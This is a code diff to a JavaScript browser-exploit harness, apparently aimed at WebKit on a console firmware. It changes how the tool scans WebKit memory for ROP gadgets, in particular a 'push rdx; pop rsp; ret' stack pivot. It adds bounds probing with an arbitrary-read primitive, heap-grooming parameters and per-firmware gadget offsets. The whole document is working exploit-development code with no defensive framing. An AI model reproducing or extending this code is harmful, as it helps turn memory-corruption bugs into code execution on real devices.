@@ -18,10 +18,16 @@ import {
     checkG5Bytes,
     g5DerivedHint,
     G5_DELTA_FROM_G0,
+    G5_EXPM1_DELTA,
+    g5Expm1Hint,
+    g5RvaSafe,
+    webkitRvaMax,
+    webkitRvaMaxFromOff,
+    saveWebkitRvaProbe,
 } from "./pivot_gadgets.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250828r";
+const BUILD_ID = "rw-20250828s";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const RESTORE_LOG = params.get("restorelog") === "1";
@@ -37,10 +43,7 @@ const SCAN_CHUNK_STEPS = parseInt(params.get("scanchunk") || "2048", 10);
 /** HW peek @ +0x2411b0 showed 48 ff c6… (not G5) — hunt rdx→rsp nearby */
 const G5_HUNT_CENTER = parseInt(params.get("g5center") || "2411b0", 16);
 const G5_HUNT_RADIUS = parseInt(params.get("g5rad") || "80000", 16);
-/** 13.00 G5 @ +0x2abccaa — G0-G4 moved low on 13.52 but G5 may still be here */
-const G5_HIGH_MIN = parseInt(params.get("g5highmin") || "2aa0000", 16);
-const G5_HIGH_MAX = parseInt(params.get("g5highmax") || "2ad0000", 16);
-const G5_HIGH_CENTER = parseInt(params.get("g5highcenter") || "2abccaa", 16);
+/** Legacy 13.00 high G5 — blocked on 13.52 (unmapped, OOM on read) */
 const G5_LEGACY_RVAS = [
     [0x2abccaa, "13.00"],
     [0x2abb0ba, "12.50"],
@@ -448,7 +451,7 @@ function runManualTest(testId) {
             return;
         }
         const hint = pivotHint(test.key);
-        if (hint > 0 && hint < SCAN_LOW_MAX) {
+        if (hint > 0 && g5RvaSafe(hint, off)) {
             const g = checkPat(p, webkitBase, hint, pat);
             mark(g.ok ? "GADGET-OK" : "GADGET-BAD",
                 test.label + " hint +0x" + hint.toString(16) + " " + g.detail);
@@ -610,6 +613,21 @@ function scanG5PatternsAt(p, webkitBase, rva, cands, center) {
     }
 }
 
+function scanCapOff() {
+    return webkitRvaMax(loadEffectiveOff());
+}
+
+function guardG5Rva(rva, tag) {
+    const off = loadEffectiveOff();
+    const cap = webkitRvaMax(off);
+    if (!g5RvaSafe(rva, off)) {
+        mark("G5-BLOCK", (tag || "G5") + " +0x" + rva.toString(16)
+            + " beyond mapped webkit (~+0x" + cap.toString(16) + ") — skip read (OOM on HW)");
+        return false;
+    }
+    return true;
+}
+
 function tryLegacyG5(rva, tag) {
     if (!ready || !window.p) {
         mark("G5-SKIP", "need Start + Save bases");
@@ -621,6 +639,7 @@ function tryLegacyG5(rva, tag) {
         mark("G5-SKIP", "no webkitBase");
         return;
     }
+    if (!guardG5Rva(rva, tag)) return;
     mark("G5-TRY", tag + " +0x" + rva.toString(16));
     const hex = gadgetBytesHex(p, webkitBase, rva, 8);
     if (hex.indexOf("??") >= 0)
@@ -640,9 +659,21 @@ function tryLegacyG5(rva, tag) {
 async function runG5ScanRange(minRva, maxRva, center, label) {
     if (!ready || !window.p || busy) return null;
     const p = window.p;
-    const { webkitBase } = basesFromSession(loadEffectiveOff());
+    const off = loadEffectiveOff();
+    const { webkitBase } = basesFromSession(off);
     if (!webkitBase) {
         mark("G5-SKIP", "no webkitBase — Save bases first");
+        return null;
+    }
+    const cap = webkitRvaMax(off);
+    if (minRva > cap) {
+        mark("G5-BLOCK", label + " min +0x" + minRva.toString(16)
+            + " beyond module ~+0x" + cap.toString(16));
+        return null;
+    }
+    maxRva = Math.min(maxRva, cap);
+    if (minRva >= maxRva) {
+        mark("G5-SKIP", label + " empty range");
         return null;
     }
     g5Hunt = {
@@ -690,22 +721,86 @@ async function runG5HuntNear() {
         mark("G5-STOP", "hunt cancelled");
         return;
     }
+    const cap = scanCapOff();
     await runG5ScanRange(
         Math.max(SCAN_PIVOT_MIN, G5_HUNT_CENTER - G5_HUNT_RADIUS),
-        Math.min(SCAN_LOW_MAX, G5_HUNT_CENTER + G5_HUNT_RADIUS),
+        Math.min(cap, G5_HUNT_CENTER + G5_HUNT_RADIUS),
         G5_HUNT_CENTER,
         "low-near-2411b0");
 }
 
-async function runG5HighScan() {
-    await runG5ScanRange(G5_HIGH_MIN, G5_HIGH_MAX, G5_HIGH_CENTER, "high-13.00-region");
+async function runG5HuntExpm1() {
+    const off = loadEffectiveOff();
+    const center = g5Expm1Hint(off) || (HW_GADGETS_1352.wk_expm1_builtin + G5_EXPM1_DELTA);
+    if (!g5RvaSafe(center, off)) {
+        mark("G5-SKIP", "expm1 hint +0x" + center.toString(16) + " out of module bounds");
+        return;
+    }
+    const cap = webkitRvaMax(off);
+    await runG5ScanRange(
+        Math.max(SCAN_PIVOT_MIN, center - G5_HUNT_RADIUS),
+        Math.min(cap, center + G5_HUNT_RADIUS),
+        center,
+        "expm1-delta");
+}
+
+async function runG5UpperScan() {
+    const off = loadEffectiveOff();
+    const cap = webkitRvaMax(off);
+    const lo = SCAN_LOW_MAX;
+    if (lo >= cap) {
+        mark("G5-SKIP", "upper range empty — module ends ~+0x" + cap.toString(16)
+            + " (13.00 high G5 @ +0x2abccaa is unmapped)");
+        return;
+    }
+    mark("G5-INFO", "scanning +0x" + lo.toString(16) + "…+0x" + cap.toString(16)
+        + " (pop rcx @ +0xeaf246 lives here — missed by 8MB cap)");
+    await runG5ScanRange(lo, cap, off.wk_POP_RCX_RET || 0xeaf246, "upper-low");
+}
+
+async function probeWebkitBound() {
+    if (!ready || !window.p || busy) return;
+    const p = window.p;
+    const off = loadEffectiveOff();
+    const { webkitBase } = basesFromSession(off);
+    if (!webkitBase) {
+        mark("MOD-SKIP", "no webkitBase");
+        return;
+    }
+    const floor = Math.max(0x100000, webkitRvaMaxFromOff(off) - 0x180000);
+    let lastOk = floor;
+    mark("MOD-PROBE", "stepping +64K from +0x" + floor.toString(16) + "…");
+    busy = true;
+    setUi();
+    try {
+        for (let rva = floor; rva < 0x3500000; rva += 0x10000) {
+            const b = read1p(p, webkitBase.add32(rva));
+            if (b == null) {
+                saveWebkitRvaProbe(lastOk);
+                mark("MOD-BOUND", "max readable ~+0x" + lastOk.toString(16)
+                    + " (+0x" + rva.toString(16) + " unreadable — no high G5 reads)");
+                return;
+            }
+            lastOk = rva;
+            if ((rva & 0xfffff) === 0)
+                mark("MOD-PROBE", "+0x" + rva.toString(16) + " ok");
+            await new Promise(r => setTimeout(r, 0));
+        }
+        saveWebkitRvaProbe(lastOk);
+        mark("MOD-BOUND", "probe cap +0x" + lastOk.toString(16));
+    } finally {
+        busy = false;
+        setUi();
+    }
 }
 
 async function runG5FullHunt() {
     scanG5Full = true;
     await runG5ScanRange(SCAN_PIVOT_MIN, SCAN_LOW_MAX, G5_HUNT_CENTER, "low-full");
     if (loadScannedPivot() && loadScannedPivot().wk_PUSH_RDX_POP_RSP_RET != null) return;
-    await runG5HighScan();
+    await runG5HuntExpm1();
+    if (loadScannedPivot() && loadScannedPivot().wk_PUSH_RDX_POP_RSP_RET != null) return;
+    await runG5UpperScan();
     if (loadScannedPivot() && loadScannedPivot().wk_PUSH_RDX_POP_RSP_RET != null) return;
     for (let i = 0; i < G5_LEGACY_RVAS.length; i++)
         tryLegacyG5(G5_LEGACY_RVAS[i][0], G5_LEGACY_RVAS[i][1]);
@@ -732,7 +827,9 @@ function peekG5Rva(rva) {
         mark("G5-SKIP", "need Start + Save bases first");
         return;
     }
-    const { webkitBase } = basesFromSession(loadEffectiveOff());
+    const off = loadEffectiveOff();
+    if (!guardG5Rva(rva, "peek")) return;
+    const { webkitBase } = basesFromSession(off);
     if (!webkitBase) {
         mark("G5-SKIP", "no webkitBase");
         return;
@@ -760,10 +857,11 @@ function wireG5Bar() {
     }
 
     addBtn("G5 hunt low", function () { runG5HuntNear(); });
-    addBtn("G5 high scan", function () { runG5HighScan(); });
+    addBtn("G5 hunt expm1", function () { runG5HuntExpm1(); });
+    addBtn("G5 scan upper", function () { runG5UpperScan(); });
     addBtn("G5 all-in", function () { runG5FullHunt(); });
+    addBtn("Probe bound", function () { probeWebkitBound(); });
     addBtn("Try G5 13.00", function () { tryLegacyG5(0x2abccaa, "13.00"); });
-    addBtn("peek 2abccaa", function () { peekG5Rva(0x2abccaa); });
     addBtn("G5 probe", function () {
         scanG5Full = true;
         runG5ClusterProbe();
@@ -790,7 +888,9 @@ function wireG5Bar() {
 
     const hint = host.querySelector(".bar-label");
     if (hint) {
-        hint.textContent = "G5: low scans missed — try G5 high scan or Try G5 13.00 @ +0x2abccaa";
+        const cap = webkitRvaMaxFromOff(Object.assign({}, HW_GADGETS_1352, PIVOT_HW_1352));
+        hint.textContent = "G5: 13.00 @ +0x2abccaa OOMs (unmapped) — use G5 scan upper (+0x800000…+0x"
+            + cap.toString(16) + ") or G5 hunt expm1 (+0x13ec77a)";
     }
 }
 
@@ -970,6 +1070,7 @@ function loadEffectiveOff() {
 }
 
 function pivotClusterRange(found) {
+    const cap = scanCapOff();
     const known = [];
     for (let i = 0; i < PIVOT_ROWS.length; i++) {
         const k = PIVOT_ROWS[i][1];
@@ -985,33 +1086,37 @@ function pivotClusterRange(found) {
     }
     return {
         minRva: Math.max(SCAN_PIVOT_MIN, lo - SCAN_CLUSTER_PAD),
-        maxRva: Math.min(SCAN_LOW_MAX, hi + SCAN_CLUSTER_PAD),
+        maxRva: Math.min(cap, hi + SCAN_CLUSTER_PAD),
     };
 }
 
 function pivotScanRange(key, phase, found) {
-    if (phase === "high") {
-        return { minRva: G5_HIGH_MIN, maxRva: G5_HIGH_MAX };
+    const off = loadEffectiveOff();
+    const cap = webkitRvaMax(off);
+    if (phase === "upper") {
+        const lo = SCAN_LOW_MAX;
+        if (lo >= cap) return null;
+        return { minRva: lo, maxRva: cap };
     }
     if (phase === "nearg5") {
-        const center = G5_HUNT_CENTER || pivotScanHint(key, found, SCAN_LOW_MAX);
-        if (center <= 0 || center >= SCAN_LOW_MAX) return null;
+        const center = G5_HUNT_CENTER || pivotScanHint(key, found, cap, off);
+        if (center <= 0 || center >= cap) return null;
         return {
             minRva: Math.max(SCAN_PIVOT_MIN, center - G5_HUNT_RADIUS),
-            maxRva: Math.min(SCAN_LOW_MAX, center + G5_HUNT_RADIUS),
+            maxRva: Math.min(cap, center + G5_HUNT_RADIUS),
         };
     }
     if (phase === "cluster") {
         return pivotClusterRange(found);
     }
     if (phase === "low") {
-        return { minRva: SCAN_PIVOT_MIN, maxRva: SCAN_LOW_MAX };
+        return { minRva: SCAN_PIVOT_MIN, maxRva: Math.min(SCAN_LOW_MAX, cap) };
     }
     const hint = pivotHint(key);
-    if (hint <= 0 || hint >= SCAN_LOW_MAX) return null;
+    if (hint <= 0 || hint >= cap) return null;
     return {
         minRva: Math.max(SCAN_PIVOT_MIN, hint - SCAN_NEAR_RADIUS),
-        maxRva: Math.min(SCAN_LOW_MAX, hint + SCAN_NEAR_RADIUS),
+        maxRva: Math.min(cap, hint + SCAN_NEAR_RADIUS),
     };
 }
 
@@ -1245,7 +1350,7 @@ async function scanPivotRowPhase(p, webkitBase, off) {
 
     let rva = pivotScan.cursor != null ? pivotScan.cursor : (range.minRva & ~7);
     let steps = 0;
-    const hint = pivotScanHint(key, pivotScan.found, SCAN_LOW_MAX);
+    const hint = pivotScanHint(key, pivotScan.found, scanCapOff(), loadEffectiveOff());
     const chunkMax = SCAN_CHUNK_STEPS > 0 ? SCAN_CHUNK_STEPS : 2048;
 
     while (rva < range.maxRva && !scanPivotStop && steps < chunkMax) {
@@ -1334,18 +1439,20 @@ async function scanPivotRowPhase(p, webkitBase, off) {
     }
 
     if (label === "G5" && pivotScan.phase === "low") {
-        pivotScan.phase = "high";
+        pivotScan.phase = "upper";
         pivotScan.cursor = null;
         pivotScan.bestHit = null;
         pivotScan.g5Cands = [];
         savePivotScanState(pivotScan);
-        mark("G5-PHASE", "low miss — high .text ~+0x2abb… (13.00 G5 region)");
+        const cap = scanCapOff();
+        mark("G5-PHASE", "low miss — upper .text +0x" + SCAN_LOW_MAX.toString(16)
+            + "…+0x" + cap.toString(16) + " (13.00 high G5 unmapped)");
         return "continue";
     }
 
-    if (label === "G5" && pivotScan.phase === "high") {
+    if (label === "G5" && pivotScan.phase === "upper") {
         logG5Cands(pivotScan.g5Cands);
-        mark("SCAN-MISS", "G5 not found — tap Try 2abccaa or G5 all-in");
+        mark("SCAN-MISS", "G5 not found — try G5 hunt expm1 or G5 all-in");
         pivotScan.rowIdx++;
         pivotScan.phase = "nearg5";
         pivotScan.bestHit = null;
@@ -1956,7 +2063,9 @@ function init() {
     if (params.get("clearlog") === "1") clearPersistedLog();
     else if (RESTORE_LOG && restorePersistedLog()) renderOut();
 
-    mark("BOOT", "build=" + BUILD_ID + " — pivot RVAs not from 13.00 (scan before native call)");
+    mark("BOOT", "build=" + BUILD_ID + " — G5 cap ~+0x"
+        + webkitRvaMaxFromOff(Object.assign({}, HW_GADGETS_1352, PIVOT_HW_1352)).toString(16)
+        + " (13.00 +0x2abccaa blocked)");
     mark("BOOT", groomBootLine(params));
     window.addEventListener("beforeunload", function () {
         stopPivotScanQuiet();
